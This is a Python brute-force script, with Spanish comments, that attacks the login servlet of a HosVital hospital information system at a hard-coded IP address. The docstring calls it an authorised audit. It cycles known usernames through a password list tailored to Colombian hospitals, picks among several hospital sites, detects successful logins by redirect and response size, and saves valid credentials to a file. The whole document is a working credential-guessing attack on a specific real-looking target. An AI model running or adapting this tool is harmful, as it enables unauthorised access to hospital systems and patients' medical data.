#!/usr/bin/env python3
"""
BRUTE FORCE LOGIN - HosVital HIS
Auditoria Autorizada - Cuidarte Tu Salud

Ataca el login del HIS con usuarios confirmados y wordlist de passwords.
Detecta login exitoso por:
  1. HTTP 302 redirect a /servlet/home
  2. Tamano de respuesta diferente al de "password incorrecto" (~11178 bytes)
  3. Ausencia del formulario de login en la respuesta

Uso:
  python3 03_brute_his.py
  python3 03_brute_his.py -u PRUEBA -w passwords.txt
  python3 03_brute_his.py -u PRUEBA -s 1  # sede BOSQUE
"""

import requests
import sys
import argparse
import time

TARGET = "http://190.66.24.91:3155/WEBHOSREAL/servlet/login"
HOME_URL = "http://190.66.24.91:3155/WEBHOSREAL/servlet/home"

# Usuarios confirmados como existentes
DEFAULT_USERS = ["PRUEBA", "hosvital"]

# Passwords comunes para sistemas hospitalarios colombianos
DEFAULT_PASSWORDS = [
    # Passwords triviales
    "123456", "password", "12345678", "1234", "12345",
    "123", "1234567890", "abc123", "qwerty",
    # El mismo usuario como password
    "PRUEBA", "prueba", "Prueba", "prueba123", "PRUEBA123",
    "hosvital", "HOSVITAL", "Hosvital", "hosvital123",
    # Passwords por defecto comunes en Colombia
    "cuidarte", "CUIDARTE", "Cuidarte", "cuidarte123",
    "tusalud", "TUSALUD", "Tusalud2026",
    "admin", "ADMIN", "Admin123", "admin123",
    "sistema", "SISTEMA", "Sistema123",
    "digital", "DIGITAL", "Digital123", "digitalware",
    # Patrones de fecha colombianos
    "2023", "2024", "2025", "2026",
    "012023", "012024", "012025", "012026",
    "Enero2026", "Abril2026",
    # Patrones hospitalarios
    "medico", "MEDICO", "enfermera", "ENFERMERA",
    "hospital", "HOSPITAL", "salud", "SALUD",
    "his2023", "HIS2023", "his2024", "HIS2024",
    # DigitalWare defaults conocidos
    "dw2023", "DW2023", "webhos", "WEBHOS",
    "hosvital2023", "HOSVITAL2023",
    # Passwords con patron nombre+numeros
    "test", "TEST", "test123", "TEST123",
    "demo", "DEMO", "demo123",
    "cambiar", "CAMBIAR", "Cambiar123",
    # Debiles comunes
    "pass", "Pass123", "P@ssw0rd", "Welcome1",
    "Temporal1", "temporal", "TEMPORAL",
]

# Sedes descubiertas (value del select)
SEDES = {
    0: "(ninguna)",
    1: "1-001-BOSQUE",
    2: "1-004-CENTRO DE EXCELENCIA",
    3: "1-005-ARMENIA",
    4: "1-006-PEREIRA",
}


def try_login(username, password, sede=0, verbose=False):
    """Intenta login y retorna resultado."""
    s = requests.Session()
    try:
        # GET para obtener cookies
        r = s.get(TARGET, timeout=15, allow_redirects=False)

        data = {
            "vUSUARIO1": username.upper(),
            "vCONTRASENA": password,
            "vMODULO": "HC",
            "vCSEDENOM": str(sede),
            "vSEDENOM": str(sede),
            "GXState": '{"_EventName":"ENTER"}',
        }

        r = s.post(TARGET, data=data, timeout=15, allow_redirects=False)

        # Indicadores de exito
        is_redirect = r.status_code in (301, 302)
        redirect_to_home = False
        if is_redirect:
            location = r.headers.get("Location", "")
            redirect_to_home = "home" in location.lower()

        body = r.text if not is_redirect else ""
        size = len(r.content)
        no_login_form = "vUSUARIO1" not in body if body else True

        # Tamanos conocidos de respuesta fallida
        # ~9974 = usuario no existe
        # ~11178 = usuario existe, password incorrecta
        known_fail_sizes = range(9900, 11300)
        unusual_size = size not in known_fail_sizes and size > 0

        success = is_redirect and redirect_to_home
        suspicious = (unusual_size and not is_redirect) or (is_redirect and not redirect_to_home)

        result = {
            "user": username,
            "password": password,
            "sede": sede,
            "status": r.status_code,
            "size": size,
            "success": success,
            "suspicious": suspicious,
            "redirect": r.headers.get("Location", ""),
            "cookies": dict(s.cookies),
        }

        if verbose:
            flag = "SUCCESS!" if success else ("SUSPICIOUS" if suspicious else "")
            print(f"  {username}:{password} => HTTP {r.status_code}, {size}b {flag}")

        return result

    except Exception as e:
        return {
            "user": username,
            "password": password,
            "sede": sede,
            "status": "ERROR",
            "size": 0,
            "success": False,
            "suspicious": False,
            "redirect": "",
            "error": str(e),
        }


def main():
    parser = argparse.ArgumentParser(description="Brute Force HosVital HIS Login")
    parser.add_argument("-u", "--user", help="Usuario especifico (default: PRUEBA,hosvital)")
    parser.add_argument("-w", "--wordlist", help="Wordlist de passwords")
    parser.add_argument("-s", "--sede", type=int, default=0, help="Codigo de sede (0-4)")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Delay entre intentos")
    parser.add_argument("-o", "--output", default="brute_results.txt", help="Archivo de salida")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose")
    args = parser.parse_args()

    users = [args.user] if args.user else DEFAULT_USERS
    passwords = DEFAULT_PASSWORDS

    if args.wordlist:
        with open(args.wordlist) as f:
            passwords = [line.strip() for line in f if line.strip()]

    sede = args.sede
    total = len(users) * len(passwords)

    print("=" * 70)
    print(" BRUTE FORCE - HosVital HIS")
    print("=" * 70)
    print(f"[*] Target: {TARGET}")
    print(f"[*] Usuarios: {users}")
    print(f"[*] Passwords: {len(passwords)}")
    print(f"[*] Sede: {SEDES.get(sede, sede)}")
    print(f"[*] Total intentos: {total}")
    print(f"[*] Delay: {args.delay}s")
    print(f"[*] Tiempo estimado: {total * args.delay / 60:.1f} min")
    print("=" * 70)

    successes = []
    suspicious = []
    count = 0

    for user in users:
        print(f"\n[*] Probando usuario: {user}")
        for pwd in passwords:
            count += 1
            result = try_login(user, pwd, sede, verbose=args.verbose)

            if not args.verbose:
                sys.stdout.write(f"\r  [{count}/{total}] {user}:{pwd[:15]:<15}")
                sys.stdout.flush()

            if result["success"]:
                print(f"\n\n{'='*70}")
                print(f" [!!!] LOGIN EXITOSO")
                print(f" Usuario: {user}")
                print(f" Password: {pwd}")
                print(f" Sede: {SEDES.get(sede, sede)}")
                print(f" Redirect: {result['redirect']}")
                print(f" Cookies: {result['cookies']}")
                print(f"{'='*70}\n")
                successes.append(result)

            elif result["suspicious"]:
                print(f"\n  [?] RESPUESTA SOSPECHOSA: {user}:{pwd} => "
                      f"HTTP {result['status']}, {result['size']}b, "
                      f"redirect={result['redirect']}")
                suspicious.append(result)

            time.sleep(args.delay)

        print()

    print("\n" + "=" * 70)
    print(f" RESULTADOS")
    print("=" * 70)
    print(f"[+] Intentos: {count}")
    print(f"[+] Exitos: {len(successes)}")
    print(f"[?] Sospechosos: {len(suspicious)}")

    if successes:
        print("\n CREDENCIALES ENCONTRADAS:")
        for s in successes:
            print(f"   {s['user']}:{s['password']} (sede {s['sede']})")

    if suspicious:
        print("\n RESPUESTAS SOSPECHOSAS (revisar manualmente):")
        for s in suspicious:
            print(f"   {s['user']}:{s['password']} => HTTP {s['status']}, {s['size']}b")

    with open(args.output, "w") as out:
        out.write(f"# Brute Force Results - {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        out.write(f"# Target: {TARGET}\n")
        out.write(f"# Total intentos: {count}\n\n")
        if successes:
            out.write("## CREDENCIALES VALIDAS:\n")
            for s in successes:
                out.write(f"{s['user']}:{s['password']}\n")
        if suspicious:
            out.write("\n## SOSPECHOSOS:\n")
            for s in suspicious:
                out.write(f"{s['user']}:{s['password']} => HTTP {s['status']}, {s['size']}b\n")

    print(f"\n[+] Resultados en: {args.output}")


if __name__ == "__main__":
    main()
